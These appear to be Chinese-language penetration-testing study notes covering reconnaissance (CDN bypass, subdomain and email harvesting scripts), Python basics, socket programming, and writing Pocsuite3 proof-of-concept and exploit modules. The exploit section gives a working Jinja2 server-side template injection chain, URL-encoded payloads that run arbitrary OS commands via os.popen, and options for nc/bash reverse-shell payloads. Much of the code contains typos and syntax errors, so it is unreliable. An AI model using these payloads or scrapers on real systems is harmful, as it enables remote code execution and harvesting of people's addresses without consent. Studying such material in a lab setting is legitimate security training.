<details>
<summary>信息搜集</summary>

```
1.拿到域名后，判断域名是否存在CDN (Content Delivery Network,内容分发网络),http://ping.chinaz.com/
[1]查询IP>1,说明IP地址并不是真实的服务器地址
[2]查询IP[2,3],同时[2,3]IP地址属于同一个运营商时，可能为服务器的出口地址-->该服务器部署在内网中，，使用了不同运营商的映射进行互联网访问
[3]查询IP地址多个，并且分布在不同的地区时，基本可以确定网站就是使用了CDN的服务

绕过CDN获取真实IP信息
[1]内部邮箱
邮件服务系统都是部署在公司内部，并且咩呦经过CDN解析，可以通过目标网站的邮箱注册或订阅邮件功能，让网站的邮箱服务器给自己的邮箱服务发生邮件
查看邮件的原始邮件头，包含邮件服务器的IP地址
[2]查看域名的历史解析记录，后来加上的CDN服务，存在未使用CDN时的真实IP地址，可以通过EXAMPLE网站https://dnsdb.io/zh-cn进行查询
[3]字域名查询，子站或旁站的IP地址拆解网站的真实IP地址
[4]国外地址访问，没有多少国内的CDN服务商会进行服务    <---
[5]主域名查询，去掉www,ping域名，看是否有变化
[6]Nslookup查询
NS记录：域名服务器的记录，nslookup -qt=ns xxx.com
MX记录：mail服务的权重值，nslookup -qt=mx xxx.com
TXT记录：为某一条记录设置说明，使用nslookup -qt=txt xxx.com

2.搜集真实IP后，whois信息进行搜集 http://whois.chinaz.com/
3.确定具体信息后，查询公司有关信息，如邮箱、邮箱格式、公司员工姓名、公司人员配置等
同时在github、码云等代码托管平台查找敏感信息：包含数据库连接信息、密码、甚至网站源代码等
4.CMS建站系统，如phpcms、eshop、wordpress、dedecms、dicuz、phpweb、dvbbs、thinkphp等
指纹识别网站http://www.yunsee.cn/finger.html --->CMS信息可以查找相关的历史漏洞
```

</details>

<details>
<summary>漏洞探测</summary>

```
AWVS(Acunetix Web Vulnerability Scanne):通过爬虫
NESSUS：系统扫描和分析软件，提供主机漏洞扫描服务
AppScan：安装在windows系统上，对Web应用进行漏洞扫描和安全测试
```

</details>

<details>
<summary>漏洞验证</summary>

```
在公开资源寻找漏洞：乌云镜像网站、Google Hacking、渗透代码网站、通用应用漏洞、厂商漏洞警告
可自己搭建乌云镜像站，WooYun.ory
```

</details>

----------------------------------------------------------------------------

<details>
<summary>python 序列</summary>

```
----------------------------------------------------------------------------
列表list = [,]
添加单个元素： .append() //尾部添加
添加列表： .extend() //尾部添加
指定位置添加： .insert(7, )

删除列表首次出现元素： .remove()
删除并返回列表中指定的下标元素： .pop() //默认值为-1，是最后一个 | .pop(0) //返回第一个元素

返回指定元素在列表中出现的次数：.count() //元素对应出现的次数

将列表中的所有元素逆序： .reverse()
对列表中的元素进行排序： .sort(key=str,reverse=False) //key指定排序依据，reverse决定升序False,降序True
----------------------------------------------------------------------------
元组 tuple = (,)
元组(,)与列表[,]不同，元组属于不可变序列
----------------------------------------------------------------------------
字典dic = {键：值,} //键不能重复，值可以重复
通过dict()创建字典： lab = dict(,)
修改字典中的元素： dic['键']=修改值
添加字典新元素： dic['']='' //保持先进后出，新添加的一直在第一个后出，最后输出
返回字典中的元素：.items()
删除字典中元素： del dic['键']
----------------------------------------------------------------------------
```

</details>


<details>
<summary>python 控制结构</summary>

```
顺序结构、选择结构、循环结构
----------------------------------------------------------------------------
选择结构
#!/user/bin/pyton
#coding:utf-8
studentScore = int(input('Scores of students: '))
if (studentScore < 60):
  print('不及格‘）
if (60 <= studentScore < 80):
  print('良好‘）
if (strdentScore >= 80):
  print('优秀')
----------------------------------------------------------------------------
循环结构：for循环一般用于有明显边界范围的情况，while循环一般用于循环次数难以确定的情况
#！/usr/bin/python
#coding:utf-8
Sum = 0
for i in range(1,101):
    Sum = Sum + i
else:
    print('Sum = ', Sum)

运行结果：5050

#!/usr/bin/python
#coding:utf=8
x = int(input('x='))
Sum = 0
while x != 0 :
    Sum = Sum + x
    x = x - 1
else:
    print('Sum=', Sum)

输入100，运行结果：5050
输入1000，运行结果：500500
----------------------------------------------------------------------------
```

</details>

<details>
<summary>文件处理</summary>

```
数据库文件、图像文件、音频文件、视频文件、文本文化等
----------------------------------------------------------------------------
文本文件：常规字符串，由文本行组成，每行通常由换行符'\n'结尾，读取、写入、删除、修改，关闭并保持

open(file[,mode='r'[,buffering=-1]])
#mode:打开后的处理方式，读模式、写模式、追加模式、二进制模式、文本模式、读写模式
#buffering:缓存模式，0:不缓存、1:使用行缓存模式、>1:缓存区的大小，默认值为-1；
#二进制文件和非交互文本文件以固定大小的块为缓冲单位，等价于io
----------------------------------------------------------------------------
对文件操作：读写、写入、追加、设置二进制模式、文本模式、读写模式

w:写入模式  文件存在，清空；文件不存在，创建
x:写入模式  创建新文件；文件存在，抛出异常
a:追加模式  也是写入模式的一种，不覆盖文件的原始内容

r: 读模式（默认模式，可省略），文件不存，抛出异常
+：读写模式
>>> f = open('demo.txt', 'r')
>>> print(f.readline()) #读取第一行内容
>>>
>>> print(f.read()) #读取全部
----------------------------------------------------------------------------
f.close() //关闭文件对象
关键字with 能够自动管理资源，总能保证文件正确关闭，并且在代码执行后自动还原开始执行代码块时的现场
>>> with open('demo.txt','a') as f:
...     f.write('hello ') #继续追加
...
----------------------------------------------------------------------------
```

</details>

<details>
<summary>异常处理结构：提高代码的鲁棒性，提高代码的容错性</summary>

```
----------------------------------------------------------------------------
[1]try...except...结构 //判断是否
try:代码块为可能引发异常的语句
except:捕获相应的异常
当try字句代码执行异常并且被except字句捕获，执行except字句的代码块

#!/usr/bin/python
#coding:utf=8
mathScore = input('数学成绩')
try:
    mathScore = int(mathScore)
    if(0<mathScore <=100):
        pritnt("输入的数学成绩为：",mathScore)
    else:
        print("输入不在本科成绩范围内")
except Exception as e:
    print('输入的数值有误')
----------------------------------------------------------------------------
[2]try...except...else...结构 //判断是 和 否，否之后; 没有异常会执行else
#!/usr/bin/python
#coding:utf=8
mathScore = input('数学成绩')
try:
    mathScore = int(mathScore)
except Exception as e:
    print('输入的数值有误')
else:
    if(0<mathScore <=100):
       pritnt("输入的数学成绩为：",mathScore)
    else:
       print('请输入正确的数学成绩') 
----------------------------------------------------------------------------
[3]try...eccept...finally...结构，无论try子句是否正常执行，finally子句中的代码块总会得到执行
在开发，该结构通常用来做清理工作，释放try子句中申请的资源
确保程序的鲁棒性，要求带有异常处理的结构。鲁棒是指系统的健壮性，是在存在异常和危险的情况下系统生存的关键

#！/usr/bin/python
#coding:utf=8
a = int(input('a:'))
b = int(input('b:'))
try:
    div = a/b
    print(div)
except Exception as e:
    print ('The second parameter cannot be 0.')
finally:
    print('运算结果')  
----------------------------------------------------------------------------
```

</details>

----------------------------------------------------------------------------

<details>
<summary>Socket网络编程</summary>

```
connect(address):连接远程计算机
send(bytes[,flags]):发送数据
recv(bufsize[,flags]):接收数据
bind(address):绑定地址
listen(backlog):开始监听，等待客户端连接
accept():响应客户端的一个请求，接受一个连接
```
</details>

<details>
<summary>服务端代码</summary>

```
# coding：utf-8
import socket
language = {'what is your name':'I am Tom','how old are you':'25','bye':'bye!'}
HOST = '127.0.0.1"
POTR = 6666
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #AF_INET：IPv4，SOCK_STREAM：TCP面向连接
s.bind((HOST,PORT))
s.listen(1) #1表示等待队列最大长度
print("Listing at port 6666")
conn,addr = s.accept() #通信套接字，客户端地址=阻塞等待
print('Connect by: ',addr)
while True: #无限循环接收消息
    data = conn.recv(1024)
    data = data.decode() #解码
    if not data:
        break #如果客户端关闭连接,返回空数据
    print('Received message:',data)

    conn.sendall(language.get(data,'Nothing').encode())
    #自动回复;.encode():把字符串变成字节；
    #language.get("what is your name", "Nothing")；
    #conn.sendall(b'I am Tom')；
    #encode() —— 编码：把字符串(str)变成字节(bytes)

conn.close() #关闭客户端连接
s.close() #释放端口
```

</details>

<details>
<summary>客户端代码</summary>

```
# coding:utf-8
import socket
import sys
HOST = "127.0.0.1"
PORT = 6666
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((HOST,PORT))
except Exception as e:
    print('server not found!')
    sys.exit()
while True: //无限循环
    c = input('YOU SAY:') #然后在键盘输入些什么
    s.sendall(c.encode())
    data = s.recv(1024)
    data = data.decode()
    print('Received:',data)
    if c.lower() == '再见': #.lower()大写转小写
        break
s.close()
```

</details>

----------------------------------------------------------------------------

<details>
<summary>可执行文件转换_PyInstaller</summary>

```
https://pypi.org/project/PyInstaller

在windows：
>>> python setup.py install
需要准备好要打包的python文件 和 需要绑定的图标类型.ico
>>> pyinstaller -F -i snail.ico xx.py
会存储在dist文件夹,运行.exe

在Linux：
>>> python setup.py install
>>> pyinstaller -F xx.py
~/dist$ ./xx.py
```

</details>

----------------------------------------------------------------------------

<details>
<summary>Proof of Concept,POC 渗透概论验证</summary>

```
Exploit,EXP 漏洞利用
渗透测试框架 Metasploit、Pocsuite、Fsociety

Pocsuite由‘知道创宇404实验室'打造的开源的远程漏洞测试框架，同时也是POC开发框架
Pocsuite 3是POC/EXP 的SDK开发包，Seebug网站由几千个基于Pocsuite的POC/EXP ，可以基于Poscuite 3 进行二次开发

Pocsuite 3集成：
ZoomEye API:批量获取指定条件的测试目标，使用ZoomEye的Dork进行搜索
Seebug API:读取指定组件或者类型的漏洞的POC或者本地POC，自动化测试
Ceye API:验证盲打的DNS和HTTP请求

安装：
>>> git clone git@github.com:nopesec/pocsuite3.git
或是
>>> wget https://github.com/knownsec/pocsuite3/archive/master.zip
或是
>>> pip install pocsuite3
验证：
>>> pocsuite -version
```

</details>


<details>
<summary>Pocsuite</summary>

```
--verify参数调用_verify方法：验证目标是否存在漏洞
--attack参数调用_attack方法：向目标发起攻击
----------------------------------------------------------------------------
def _attack(self):
    result = {}
    ...
    return self.parse_output(result)

def _verify(self):
    result = {}
    ...
    return self.parse_output(result)
----------------------------------------------------------------------------
[1]Verify验证模式；-r poc脚本路径；-u 目标地址;
>>> python pocsuite.py -r pocs/test1.py -u https://www.xxx.com --verify
[2]批量验证;-f 目标IP写到txt文本
>>> python pocsuite.py -r pocs/test1.py -u url.txt --verify
[3]对所有poc目标进行测试
>>> python pocsuite.py -r pocs/* -u https://www.xxx.com --verify
[4]使用多线程
>>> python pocsuite.py -r pocs/test1.py -u url.txt --verify --threads 10
[5]使用Zoomeye搜索引擎，搜索开放端口为6379的Redis服务
>>> python cli.py --dork 'port:6379' --vul-keyword 'redis' --max-page 2
[6]Attack模式，向目标发起有效攻击
>>> python pocsuite.py -r pocs/test1.py -u url.txt --attack
[7]shell模式
>>> python pocsuite.py -r pocs/test1.py -u url.txt --shell
[8]使用自定义命令'comman‘，调用外部传递参数，进行半交互式命令执行
>>> python pocsuite.py -r pocs/test1.py -u url.txt --attack --command "whoami"
```

</details>


<details>
<summary>POC 脚本编写</summary>

```
1.Flask服务模版环境搭建
Flask是python编写的轻量级Web应用框架，使用BSD授权
WSGI工具箱采用Werkzeug,
模版引擎规则使用Jinja2
Flask属于微框架micro-framework

通过wget或Github下载
Docker-compose build //编译下载漏洞环境所需的配置
Docker-compose up -d //启动漏洞环境
安装之后访问 本机地址:8080

漏洞服务代码
~# docker ps
~# docker exec -it 93s2 bash
/ app# ls
/ app# cat app.py
<SNIP>
name = request.args.get('name', 'guest') //name的值是直接从get参数中获取的，所以Template是完全可控的
</SNIP>

可在 本机地址:8000?name={{2*2}} 回车

POC的命名形式： 组成漏洞应用名_版本号_漏洞类型名称 （只能小写、下划线、数字）
```

</details>

<details>
<summary>编写POC实现类DemoPOC,继承自POCBase类</summary>

```
from poscuite3.api import Output, POCBase, register_poc, requests, logger
from poscuite3.api import get_listener_ip, get_listener_port
from poscuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib utils import random_str

    class DemoPOC(POCBase):
```

</details>

<details>
<summary>填写POC信息字段</summary>

```
vulID = '1571'       #ssvid ID ,如果是提交漏洞的同时提交PoC,则写成0
version = '1'         #默认为1
author = 'seebug'    #POC作者名字
vulDate = '2014-10-16'  #漏洞公开的时间，不明确时可以写今天
createDate = '2014-10-16' #编写POC的日期
updateDate = '2014-10-16' #更新时间，默认和编写时间一样
references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html'] #漏洞地址来源，0day不用写
name = 'Drupal 7.x /includes/database/database.inc name_SQL_POC' #POC名称
appPowerLink = 'https://www.drupal.org/' #漏洞厂商的主页地址
appName = 'Drupal'  #漏洞应用名称
appVersion = '7.x'  #漏洞影响版本
vulType = 'SQL Injection'   #漏洞类型
desc = '''
Drupal 在处理IN语句时，展开数组时key带入SQL语句导致SQL注入，可以添加管理员，造成信息泄露
    ‘’‘    #漏洞简要描述
samples = []  #测试样列，使用POC测试成功的网站
install_requires = []
```

</details>

<details>
<summary>编写验证模式，在_verify方法中写入POC验证脚本</summary>

```
def _verify(self):
    output = Output(self)  #验证代码
    if result:    #result 表示放回结果
        output.success(result)
    else:
        output.fail('target is not vulnerable')
    return output
```

</details>

<details>
<summary>编写攻击模式</summary>

```
#用_attack()函数中写入EXP利用脚本，在攻击模式下可以对目标进行getshell、查询管理员账户密码等操作，定义它的方法与检测模式类似
def _attack(self):
    output = Output(self)
    result = {}
    #攻击代码
#如果该POC没有攻击模式，可以在_attack()函数下加入return self._verify(),无须再写_attack()函数

#Poscuite框架 填写漏洞 IP地址进行url构造 ---> ‘/?name='
#判断其返回状态及payload值，200:网页正常请求 484:服务器将url传入的payload正常执行，说明此处存在安全漏洞

def _verify(self):
    '''verity mode'''
    result = {}
    path = "/?name="
    url = self.url + path
    payload = "{{2*2}}"

    #first req
    try:
        resq = requests.get(url + payload)
        if resq and resq.status_code == 200 and "484" in resq.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = payload
        except Exception,e:
            pass
        return self.parse_output(result)
----------------------------------------------------------------------------
//将模版_verify方法替换Flask漏洞检测的脚本便完成了POC的编写
//执行
root@kali:~/pocsuite3-master# pocsuite -r test2.py -u http://127.0.0.1:8000 --verify
```

</details>

<details>
<summary>EXP 脚本编写</summary>

```
----------------------------------------------------------------------------
#EXP脚本的编写POC脚本编写一样，只需要修改_attack部分，替换成漏洞利用的脚本即可
#Jinja2模版访问python的内置变量并调用时，需要用到python沙盒逃逸方法

__bases__:以元组返回一个类所直接继承的类
__mro__:以元组返回继承关系链
__class__:返回对象所属的类
__globals__:以dict返回函数所在模块命名空间中的所有变量
__subclasses__():以列表返回类的子类
_builtins_:内建函数
----------------------------------------------------------------------------
python中可以直接运行一些函数，如int(),list()等，这些函数可以在__builtins__中查到
查看的方法时dir(__builtins__)
利用python特性，渗透测试的思路是利用_builtins_的特性得到eval

for c in().__class__.__base__[0].__subclass__():
    if c.__name__=='_IterationGuard':
    c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")

再将其转为Jinja2语法格式，在每个语句的开始和结束处使用{{%%}}括起来,%20{% --> :

{%%20for%20c%20in%20[].__class__.__base__.__subclass__()%20%}%20{%' \
'%20if%20c.__name__==%27_IterationGuard%27%20%}%20{{%20c.__init__.__globals__[%27__builtins__%27]' \
'[%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%' \
'%20endfor%20%}

#拆解
%20{{%20c.__init__.__globals__[%27__builtins__%27][%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%%20endfor%20%}
#再拆解
%20{{%20  %20%%}  %20{%%20endif%20%}%20{%%20endfor%20%}
#再拆解
{{  %%}

[1]在{{  %%}这里面的是c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")

[2].system('whoami')") ---> .popen(%27whomi%27.read()")

[3]CyberChef: 'URL Decode' -> 'URL Encode'

%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclass__()%20%25%7D%20%7B%25'%20%5C%0A'%20if%20c.__name__=='_IterationGuard'%20%25%7D%20%7B%7B%20c.__init__.__globals__%5B'__builtins__'%5D'%20%5C%0A'%5B'eval'%5D(%22__import__('os').popen('whomi'.read()%22)%20%25%25%7D%20%7B%25%20endif%20%25%7D%20%7B%25'%20%5C%0A'%20endfor%20%25%7D
----------------------------------------------------------------------------
'%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()'\
    '%20%25%7D%20%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20'\
    'for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__'\
    '%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()'\
    '%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__("os").popen("'+cmd+'").read()%27)'\
    '%20%7D%7D%oA%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor'\
    '%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'

'{% for c in [].__class__.__base__.__subclasses__()%}
    {% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}
    {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("' cmd '").read()')}}
    {% endif %}{% endif %}{% endfor %}
    {% endif %}{% endfor %}'
----------------------------------------------------------------------------
```

</details>

<details>
<summary>将EXP写到_attack方法中</summary>

```
def _attack(self):
    '''attack mode'''
    result = {}
    path = "/?name="
    url = self.url + path
    payload = '{%%20for%20c%20in%20[].__class__.__base__.__subclass__()%20%}%20{%' \
'%20if%20c.__name__==%27_IterationGuard%27%20%}%20{{%20c.__init__.__globals__[%27__builtins__%27]' \
'[%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%' \
'%20endfor%20%}'

    try:
        resq = requests.get(url + payload)
        if resq and resq.status_code == 200 and "www" in resq.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = payload
        except Exception,e:
            pass
        return self.parse_output(result)
----------------------------------------------------------------------------
//Jinja2 SSTI Payload
//运行
root@kali:~/pocsuite3-master# pocsuite -r test2.py -u http://127.0.0.1:8000 --attack
```

</details>

<details>
<summary>接受用户输入的命令行参数</summary>

```
def _options(self):
    o = OrderedDict()
    payload = {
        "nc": REVERSE_PAYLOAD.NC,
        "bash": REVERSE_PAYLOAD.BASH,
    }
    o["command"] = OptDict(selected="bash", default=payload)
    return o
```

</details>

<details>
<summary>创建cmd变量</summary>

```
def _attack(self):
    result = {}
    path = "?name="
    url = self.url + path
    #print(url)
    cmd = self.get_option("command")
  
    payload = '%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()'\
    '%20%25%7D%20%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20'\
    'for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__'\
    '%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()'\
    '%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__("os").popen("'+cmd+'").read()%27)'\
    '%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor'\
    '%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'
    try:
        resq = requests.get(url + paylaod)
        t = resq.text
        t = t.replace('\n', '').replace('\r','')
        print(t)
        t = t.replace(" ","")
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = url
        result['VerifyInfo']['Name'] = t
    except Exception as e:
        return
----------------------------------------------------------------------------
root@kali:~/pocsuite3-master# pocsuite -r test3.py -u http://x.x.x.x:8000/ --attack --command 'id'
//Flash漏洞，"{{}}"中的内容会被当作代码执行，相应的防御中就需要对"{{}}"进行过滤，禁止次符号传入参数中。
```

</details>

----------------------------------------------------------------------------
#### 被动信息搜索

<details>
<summary>IP查询</summary>

```
>>> import socket
>>> ip = socket.gethostbyname('www.baidu.com') //gethostbyname()函数
>>> print(ip)
```

</details>

<details>
<summary>whois查询</summary>

```
pip install python-whois //模块
>>> from whois import whois
>>> data = whois('www.baidu.com')
>>> print(data)
```

</details>

<details>
<summary>子域名挖掘subdomain.py</summary>

```
#! /usr/bin/env python
# _*_ coding:utf-8 _*_
import requests
from bs4 improt BeautifulSoup
from usrllib.parse import urlparse
import sys

def bing_search(site, pages):
    Subdomain = [] #以列表形式存储子域名
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': 'texe/html,application/xhtml+xml,application/xml;q=0.9, */*;q=0.8',
        'Referer': "https://cn.bing.com",
        'Cookie': 'MUID=XXXXXXXXX&t=6" #填写相应的Cookie值
    }
    for i in range(1,int(pages)+1):
        url = "https://cn.bing.com/search?q=site%3a"+site+"&go=Search&qs=ds&first="+ str((int i)-1)*10) + "&FORM=PERE"
        html = requests.get(url, heades=headers)
        soup = BeautifulSoup(html.content, 'html.parser')
        job_bt = soup.findAll('h2')
        for i in job_bt:
            link = i.a.get('href')
            domain = str(urlparse(link).scheme + "://" + urlparse(link).netloc)
            if domain in Subdomain:
                pass
            else:
                Subdomain.append(domain)
                print(domain)

if __name__ == '__main__':
    if len(sys.argv) == 3:
        site = sys.argv[1]
        page = sys.argv[2]
    else:
        print ("usage: %s baidu.com 10" % sys.argv[0]) #输出帮助信息
        sys.exit(-1)
    Subdomain = bing_search(site, page)

//运行：
//# python3 subdomain.py baidu.com 15
//输入baidu.com,对该域名进行子域收集,15为引擎页数
```
</details>

<details>
<summary>邮件爬取</summary>

```
import sys
import getopt
import requests
from bs4 import BeautifulSoup
import re

#[1]
#没有异常发送，执行定义的start()函数，通过sys.argv[]实现外部指令的接受。
#sys.argv[0]表示代码本身的文件路径
#sys.argv[1:]表示从第一个命令行参数到输入最后一个命令行参数，存储形式为list类型

if __name__ == '__main__':
    #定义异常
    try:
        start(sys.argv[1:])
    except  KeyboardInterrupt:
        print("interrupted by user, killing all threads...")

#[2]
#编写命令行参数处理功能
#getopt.getopt()函数处理命令行参数，短选项'-字母',长选项'--单词'
#opts为一个两元组列表，(选项串,附加参数)
#通过for语句循环输出opts列表中的数值并赋值给自定义的变量

#主函数，传入用户输入的参数
def start(argv):
    url = ""
    pages = ""
    if len(sys.argv) < 2:
        print("-h 帮助信息;\n")
        sys.exit()
    #定义异常处理
    try:
        banner()
        opts,args = getopt.getopt(argv, "-u:-p:-h")
    except getopt.GetoptError:
        print('Error an argument!')
        sys.exit()
    for opt ,arg in opts:
        if opt == "-u":
            url = arg
        elif opt == "-p":
            pages = arg
        elif opt == "-h":
            print(usage())
    launcher(url ,pages)

#[3]
#输出帮助信息
#开头: \033[显示方式; 前景色 ; 背景色m
#结尾部分： \033[0m

#print('\033[0;30;41m 字样 \033[0m')

#print('\033[0;36;47m 字样 \033[0m')

#banner信息
def banner()
print('\033[1;34m###############################################################################\033[0m\n'
      '\033[1;34m##################\033[1;32字样\033[1;34m#######################################\033[0m\n'
      '\033[1;34m###############################################################################\033[0m\n'
#使用规则
def usage():
    print('-h: --help;')
    print('-u: --url;')
    print('-p: --pages;')
    print('eg: python -u "www.baidu.com" -p 100'+'\n')
    sys.exit()
##未授权函数检测

#[4]
#确定搜索邮件的关键字
#调用bing_search()和baidu_search()两个函数
#获取的结果进行列表合并，去重之后，循环输出

#漏洞回调函数
def launcher(url, pages):
    email_num = []
    key_words = ['email', 'mail', 'mailbox', '邮件', '邮箱', 'postbox']
    for page in range(1,int(page)+1):
        bing_emails = bing_search(url, page, key_word)
        baidu_emails = baidu_search(url, page, key_word)
        sum_emails = bing_emails + baidu_emails
        for email in sum_emails:
            if email in email_nums:
                pass
            else:
                print(email)
                with open('data.txt', 'a+') as f:
                    f.write(email + '\n')
                email_num.append(email)

#[5]bing搜索引擎
#bing引擎具有反爬防护，
#会通过限定referer、cookie等信息确定是否网页爬取操作
#可以通过指定referer与requests.session()函数自动获取cookie信息，绕过

def bing_search(url, page, key_word):
    referer = "http://cn.bing.com/search?q=email+site%3abaidu.com&qs=n&sp=-1&pq=emailsite%3abaidu.com&first=1&FORM=PERE1"
    conn = requests.session()
    bing_url = "http://cn.bing.com/search?q=" + key_work + "+site%3a" + url + "&qs=n&sp=-1&pq=" + key_word + "site%3a" +url + "&first=" + str((page-1)*10) + "&FORM=PERE1"
    conn.get('http://cn.bing.com', headers=headers(referer))
    r = conn.get(bing_url, stream=True, headers=headers(referer), timeout=8)
    emails = search_emails(r.text)
    return emails

#[6]baidu搜索引擎
#百度反爬防护：referer和cookie进行校验、在页面中通过JavaScript语句进行动态请求链接，
#从而导致不能动态获取页面中的信息
#可以通过，对链接的提取，再进行requests请求

def baidu_search(url, page, key_word):
    email_list = []
    emails = []
    referer = "https://www.baidu.com/s?wd=email+site%3Abaidu.com&pn=1"
    baidu_url = "https://www.baidu.com/s?wd="+key_word+"+site%3A"+url+"&pn="+str((page-1)*10)
    conn = requests.session()
    conn.get(referer,headers=headers(referer))
    r = conn.get(baidu_url, headers=headers(regerer))
    soup = BeautifulSoup(r.text, 'lxml')
    tagh3 = soup.find_all('h3')
    for h3 in tagh3:
        href = h3.find('a').get('href')
        try:
            r = requests.get(href, headers=headers(referer),timeout=8)
            emails = search_email(r.text)
        except Exception as e:
            pass
        for email in emails:
            email_list.append(email)
    return email_list

#[7]正则表达获取邮箱密码

def search_email(html):
    emails = re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+",html,re.I)
    return emails

def headers(referer):
    headers = {'User-Agent': 'Mozilla/5.0 (X111; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        'Accept': '*.*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Referer': referer

//执行
//# python3 emailCraw.py -u "baidu.com" -p 1
//-u 参数指定域名 -p page
```

</details>

#### 主动信息搜索

<details>
<summary>基于ICMP的主机发现_Scapy库</summary>

```
#Internet Control Message Protocol,Internet报文协议)
#scapy用于发送ping请求和接收目标主机的应答数据
#差错通知
#信息查询
#Scapy库：TCP,UDP,IP,ARP等
# python3 -m pip install -i https://pypi.douban.com/simple --pre scapy[complete]

#!/usr/bin/python
#coding:utf-8
from scapy.all import *  
from random import randint  
from optparse import PotionParser 

#将处理后IP地址传入 Scan()函数
def main():
    parser = OptionParser("Usage:%prog -i <target host> ")    #输出帮助信息
    parser.add_option('-i', type='string', dest='IP', help='specify target host')  #获取IP地址参数
    options,args = parser.parse_args()
    print("Scan report for " + options.IP + "\n")

    if '-' in options.IP:
        for i in range(int(options.IP.split('-')[0].split('.')[3]), int(options.IP.split('-')[1]) + 1):
            Scan(
                options.IP.split('.')[0] + '.' + options.IP.split('.')[1] + '.' + options.IP.split('.')[2] + '.' + str(i))
            time.sleep(0.2)
        else:
            Scan(options.IP)
        print("\nScan finished!...\n")

if __name__ == "__main__":
    try:
        main()
    excetp KeyboardInterrupt:
        print("interrupted by user, killing all threads...")

#Scan()函数调用ICMP
def Scan(ip):
    ip_id = randint(1, 65535)
    icmp_id = randint(1, 65535)
    icmp_seq = randint(1, 65535)
    packet = IP(dst=ip, ttl=64, id=ip_id)/ICMP(id=icmp_id, seq=icmp_seq)/b'rootkit'
    result = sr1(packet, timeout=1, verbose=False)   #   verbose=False<----ICMP探测主机存活?!
    if result:
        for rcv in result:
            scan_ip = rcv[IP].src
            print(scan_ip + '--->' 'Host is up')
    else:
        print(ip + '--->' 'host is down')

//运行
// # python3 ICMP_host.py -i IP
```

</details>

<details>
<summary>基于ICMP的主机发现_Namp库</summary>

```
# -sn 只测试该主机的状态
# -PE 表示使用ICMP

#!/usr/bin/python3
# -*- coding: utf-8 -*-

import nmap
import optparse

#将处理后IP地址传入 NampScan函数
if __name__ == '__main__':
    parser = optparse.OptionParser('usage: python %prog -i ip \n\n' 'Example: python %prog -i 192.168.1.1 [192.168.1.1-100]\n')

    # 添加目标IP参数
    parser.add_option('-i', '--ip', dest='targetIP', default='192.168.1.1', type='string', help='target ip address')
    options,args = parser.parser_args[])

    if '-' in options.targetIP:
        for i in range(int(options.targetIP.split('-')[0].split('.')[2], int(options.targetIP.split('-')[1])) + 1):
            NampScan(options.targetIP.split('.')[0] + '.' + options.targetIP.split('.')[1] + '.' + options.targetIP.split('.')[2] + '.' + str(i))
    else:
        NmapScan(options.targetIP)

#NampScan函数 调用nm.scan()函数，发起ping扫描
#argusments 为Nmap的扫描参数
# -sn:使用ping进行扫描
# -PE:使用ICMP的echo请求包(-pp：使用timestamp参数包，-PM：netmask请求包

def NmapScan(targetIP):
    # 实例化 PortScanner 对象
    nm = nmap.PortScanner()
    try:
        result = nm.scan(hosts=targetIP, arguments='-sn -PE')

        # 对结果进行切片，提取主机状态信息
        state = resulte['scan'][targetIP]['status']['state']
        print("[{}] is [{}]".format(targetIP, state))
    except Exception as e:
        pass

//运行
// # python3 nmap_ICMP_find.py -i IP

//缺陷：网络设备对ICMP采取了屏蔽策略时，就会导致扫描结果不准确
```

</details>

<details>
<summary>基于TCP、UDP的主机发现_TCP实现探测主机</summary>

```
//TCP三次握手原来进行主机存活的探测。 ACK -- 主机存活 -- RST or SYN -- 主机存活 -- SYN/ACK、RST
//工作原理：flags字段有值，主机存活。
//flags { SYN建立连接, FIN关闭连接, ACK应答, PSH包含DATA数据传输, RST连接重置, URG紧急指针 }

